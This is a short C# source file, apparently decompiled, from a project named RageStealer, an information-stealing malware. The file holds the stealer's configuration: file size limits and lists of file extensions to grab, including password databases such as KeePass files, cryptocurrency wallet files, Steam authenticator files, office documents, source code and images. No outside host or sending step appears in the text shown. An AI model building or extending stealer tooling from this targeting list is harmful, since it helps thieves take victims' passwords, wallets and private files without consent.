using System.Collections.Generic;

namespace RageStealer.Helper;

internal class Config
{
	public static int FileSizeLimit = 5120;

	public static int GrabberSizeLimit = 26214400;

	public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
	{
		["Document"] = new string[12]
		{
			"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
			"json", "mafile"
		},
		["DataBase"] = new string[13]
		{
			"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
			"dbf", "wallet", "ini"
		},
		["SourceCode"] = new string[19]
		{
			"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php",
			"go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino"
		},
		["Image"] = new string[7] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
	};
}
